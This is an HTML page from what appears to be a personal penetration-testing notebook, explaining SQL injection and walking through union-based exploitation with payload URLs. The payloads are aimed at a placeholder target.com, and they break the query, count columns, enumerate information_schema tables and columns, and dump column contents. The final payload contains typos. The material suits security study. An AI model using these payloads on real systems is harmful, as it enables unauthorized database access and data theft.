@@ -1,0 +1,1059 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>sql injection · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="sqli_to_shell.html" />
+    
+    
+    <link rel="prev" href="../antivirus/17_3.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    Index
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Getting comfortable with linux</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../linux/2_4.html">
+            
+                <a href="../linux/2_4.html">
+            
+                    
+                    finding your way around
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../linux/2_5.html">
+            
+                <a href="../linux/2_5.html">
+            
+                    
+                    managing linux services
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../linux/2_6.html">
+            
+                <a href="../linux/2_6.html">
+            
+                    
+                    searching, installing, and removing tools
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="../linux/permission_table.html">
+            
+                <a href="../linux/permission_table.html">
+            
+                    
+                    Permission table
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Command line fun / Text -fu</li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" data-path="../linux/3_1.html">
+            
+                <a href="../linux/3_1.html">
+            
+                    
+                    The Bash Environment
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" data-path="../linux/3_2.html">
+            
+                <a href="../linux/3_2.html">
+            
+                    
+                    piping and redirection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3" data-path="../linux/3_3.html">
+            
+                <a href="../linux/3_3.html">
+            
+                    
+                    Text searching and manipulation
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.4" data-path="../linux/3_4.html">
+            
+                <a href="../linux/3_4.html">
+            
+                    
+                    Editing files from cmd line
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.5" data-path="../linux/3_5.html">
+            
+                <a href="../linux/3_5.html">
+            
+                    
+                    Comparing files
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.6" data-path="../linux/3_6.html">
+            
+                <a href="../linux/3_6.html">
+            
+                    
+                    Managing process
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.7" data-path="../linux/3_7.html">
+            
+                <a href="../linux/3_7.html">
+            
+                    
+                    File and cmd Monitoring
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.8" data-path="../linux/3_8.html">
+            
+                <a href="../linux/3_8.html">
+            
+                    
+                    curl
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.9" data-path="../linux/3_9.html">
+            
+                <a href="../linux/3_9.html">
+            
+                    
+                    Customizing Bash environment
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Practical tools</li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" data-path="../tools/4_1.html">
+            
+                <a href="../tools/4_1.html">
+            
+                    
+                    netcat
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2" data-path="../tools/4_3.html">
+            
+                <a href="../tools/4_3.html">
+            
+                    
+                    powershell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.3" data-path="../tools/wireshark.html">
+            
+                <a href="../tools/wireshark.html">
+            
+                    
+                    Wireshark
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.4" data-path="../tools/tcpdump.html">
+            
+                <a href="../tools/tcpdump.html">
+            
+                    
+                    tcpdump
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Bash Scripting</li>
+        
+        
+    
+        <li class="chapter " data-level="5.1" data-path="../scripts/5_1.html">
+            
+                <a href="../scripts/5_1.html">
+            
+                    
+                    intro to bash scripting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2" data-path="../scripts/5_2.html">
+            
+                <a href="../scripts/5_2.html">
+            
+                    
+                    Variables
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.3" data-path="../scripts/5_3.html">
+            
+                <a href="../scripts/5_3.html">
+            
+                    
+                    if,else,elif statement
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.4" data-path="../scripts/5_4.html">
+            
+                <a href="../scripts/5_4.html">
+            
+                    
+                    Boolean Logical Operations
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.5" data-path="../scripts/5_5.html">
+            
+                <a href="../scripts/5_5.html">
+            
+                    
+                    Loops
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.6" data-path="../scripts/5_6.html">
+            
+                <a href="../scripts/5_6.html">
+            
+                    
+                    Functions
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Information Gathering</li>
+        
+        
+    
+        <li class="chapter " data-level="6.1" data-path="../osint/6_2.html">
+            
+                <a href="../osint/6_2.html">
+            
+                    
+                    Website Recon
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.2" data-path="../osint/6_4.html">
+            
+                <a href="../osint/6_4.html">
+            
+                    
+                    Google Hakcing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.3" data-path="../osint/6_6.html">
+            
+                <a href="../osint/6_6.html">
+            
+                    
+                    Recon-ng
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.4" data-path="../osint/6_7.html">
+            
+                <a href="../osint/6_7.html">
+            
+                    
+                    open-source code
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.5" data-path="../osint/6_8.html">
+            
+                <a href="../osint/6_8.html">
+            
+                    
+                    shodan
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.6" data-path="../osint/dns.html">
+            
+                <a href="../osint/dns.html">
+            
+                    
+                    Dns enumeration
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">File Transfers</li>
+        
+        
+    
+        <li class="chapter " data-level="7.1" data-path="../file_transfer/16_1.html">
+            
+                <a href="../file_transfer/16_1.html">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="7.2" data-path="../file_transfer/16_2.html">
+            
+                <a href="../file_transfer/16_2.html">
+            
+                    
+                    linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="7.3" data-path="../file_transfer/upgrade_shell.html">
+            
+                <a href="../file_transfer/upgrade_shell.html">
+            
+                    
+                    upgrading Non-interactive shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Antivirus Evasion</li>
+        
+        
+    
+        <li class="chapter " data-level="8.1" data-path="../antivirus/17_1.html">
+            
+                <a href="../antivirus/17_1.html">
+            
+                    
+                    what is antivirus
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.2" data-path="../antivirus/17_2.html">
+            
+                <a href="../antivirus/17_2.html">
+            
+                    
+                    Method of detecting malicious code
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.3" data-path="../antivirus/17_3.html">
+            
+                <a href="../antivirus/17_3.html">
+            
+                    
+                    Bypassing AV Detection
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Web Attacks</li>
+        
+        
+    
+        <li class="chapter active" data-level="9.1" data-path="sql.html">
+            
+                <a href="sql.html">
+            
+                    
+                    sql injection
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="9.1.1" data-path="sqli_to_shell.html">
+            
+                <a href="sqli_to_shell.html">
+            
+                    
+                    upload shell using sql injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Active Directory Attacks</li>
+        
+        
+    
+        <li class="chapter " data-level="10.1" data-path="../active_dir/1.html">
+            
+                <a href="../active_dir/1.html">
+            
+                    
+                    introduction to AD
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="10.2" data-path="../tools/4_3.html">
+            
+                <a href="../tools/4_3.html">
+            
+                    
+                    powershell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="10.3" data-path="../active_dir/2.html">
+            
+                <a href="../active_dir/2.html">
+            
+                    
+                    Domain Enumeration
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="10.4" data-path="../active_dir/priv_esca.html">
+            
+                <a href="../active_dir/priv_esca.html">
+            
+                    
+                    Local Privilege Escalation
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="10.5" data-path="../active_dir/user_hunt.html">
+            
+                <a href="../active_dir/user_hunt.html">
+            
+                    
+                    User Hunting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="10.6" data-path="../active_dir/bloodhound.html">
+            
+                <a href="../active_dir/bloodhound.html">
+            
+                    
+                    Bloodhound
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="10.7" data-path="../active_dir/lateral.html">
+            
+                <a href="../active_dir/lateral.html">
+            
+                    
+                    Lateral Movement
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Binary Exploitation</li>
+        
+        
+    
+        <li class="chapter " data-level="11.1" data-path="../bin_exp/intro/intro.html">
+            
+                <a href="../bin_exp/intro/intro.html">
+            
+                    
+                    1. introduction
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="11.1.1" data-path="../bin_exp/intro/assembly.html">
+            
+                <a href="../bin_exp/intro/assembly.html">
+            
+                    
+                    1.1 Assembly
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="11.1.2" data-path="../bin_exp/intro/radare2.html">
+            
+                <a href="../bin_exp/intro/radare2.html">
+            
+                    
+                    1.2 Radare2
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Sec 660</li>
+        
+        
+    
+        <li class="chapter " data-level="12.1" data-path="../sec660/">
+            
+                <a href="../sec660/">
+            
+                    
+                    READme
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Networking</li>
+        
+        
+    
+
+    
+        
+        <li class="header">Crypto</li>
+        
+        
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >sql injection</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="sql-injection">sql injection</h1>
+<p>SQL injection is a technique where a malicious user can inject SQL Commands into an SQL statement via a web page.</p>
+<h4 id="type-of-sql-injection">Type of SQL Injection</h4>
+<ul>
+<li>In Band</li>
+<li>Out of Band</li>
+<li>Blind SQLI</li>
+</ul>
+<h4 id="sqli-exploitation-technique">SQLI Exploitation Technique</h4>
+<ul>
+<li>Error Based Exploitation</li>
+<li>Union Based Exploitation</li>
+<li>Boolean Based Exploitation</li>
+<li>Time-Based Delay Exploitation</li>
+<li>Out of Band Exploitation</li>
+</ul>
+<h4 id="try-to-identify--where-the-application-interact-with-db">Try to Identify- where the application interact with DB</h4>
+<ul>
+<li>Authentication Page</li>
+<li>Search Fields</li>
+<li>Post Fields</li>
+<li>Get Fields</li>
+<li>HTTP Header</li>
+<li>Cookie</li>
+</ul>
+<h4 id="basic-sql-functions">Basic sql Functions</h4>
+<table>
+<thead>
+<tr>
+<th>cmd</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SELECT</td>
+<td>read data from the database based on search criteria</td>
+</tr>
+<tr>
+<td>INSERT</td>
+<td>insert new data into the database</td>
+</tr>
+<tr>
+<td>UPDATE</td>
+<td>update existing data based on given criteria</td>
+</tr>
+<tr>
+<td>DELETE</td>
+<td>delete existing data based on given criteria</td>
+</tr>
+<tr>
+<td>Order By</td>
+<td>used to sort the result-set in ascending or descending order</td>
+</tr>
+<tr>
+<td>Limit By</td>
+<td>the statement is used to retrieve records from one or more tables</td>
+</tr>
+</tbody>
+</table>
+<h4 id="exploit">Exploit</h4>
+<h6 id="break-the-query">Break the Query</h6>
+<ul>
+<li>first we break the query using Character String Indicators <code>&#x2018; &#x201C;  \</code> . by breaking query we get sql error. Example.</li>
+</ul>
+<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x201D;1&#x201D; LIMIT 0,1&#x2032; at line 1</code></p>
+<hr>
+<h5 id="fix-the-query">Fix the Query</h5>
+<ul>
+<li>next we Fix the query using comment <code># or &#x2013; -(hyphen hyphen)</code></li>
+</ul>
+<hr>
+<h5 id="order-clause">order clause</h5>
+<ul>
+<li><p>Now we will try to add query between the quote and comment to get information from the database</p>
+</li>
+<li><p>We used <code>SELECT</code> query to get information from database. to execute two <code>SELECT</code> querty we need to use <code>UNION</code> in between select queries. but <code>Union</code> have precondition that number of columns in both select statement should be same. so next we need to find out number of columns. we find out number of columns using <code>order by</code></p>
+</li>
+</ul>
+<p><em>ORDER BY clause will arrange the result set in ascending or descending order of the columns used in the query.</em></p>
+<p><code>http://target.com/product?id=2&apos; order by 1,2,3 --</code></p>
+<hr>
+<h6 id="find-vuln-columns">find vuln columns</h6>
+<ul>
+<li>now we can use <code>UNION</code> operator with another <code>SELECT</code> query.next we find the columns to get output.</li>
+</ul>
+<p><code>http://target.com/product?id=2&apos; union select 1,2,3 --</code> it will display columns number which we use to extract information from database.</p>
+<hr>
+<h6 id="find-tables-in-database">find tables in database.</h6>
+<p><code>http://target.com/product?id=2&apos; union select 1,table_name,3 from information_schema.tables where table_schema=database() --</code></p>
+<p>Get all table names</p>
+<p><code>http://target.com/product?id=2&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --</code></p>
+<hr>
+<h6 id="finding-columns-in-tables">finding columns in tables</h6>
+<p><code>http://target.com/product?id=2&apos;  union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; --</code></p>
+<hr>
+<h6 id="to-get-content-of-columns">To get Content of columns</h6>
+<p><code>http//target.com/product?id=2&apos; union select 1,group_concat(coumns_name),3 from table_name --</code></p>
+<hr>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../antivirus/17_3.html" class="navigation navigation-prev " aria-label="Previous page: Bypassing AV Detection">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="sqli_to_shell.html" class="navigation navigation-next " aria-label="Next page: upload shell using sql injection">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"sql injection","level":"9.1","depth":1,"next":{"title":"upload shell using sql injection","level":"9.1.1","depth":2,"path":"web/sqli_to_shell.md","ref":"web/sqli_to_shell.md","articles":[]},"previous":{"title":"Bypassing AV Detection","level":"8.3","depth":1,"path":"antivirus/17_3.md","ref":"antivirus/17_3.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"web/sql.md","mtime":"2020-11-26T08:55:58.158Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-12-06T06:16:42.760Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
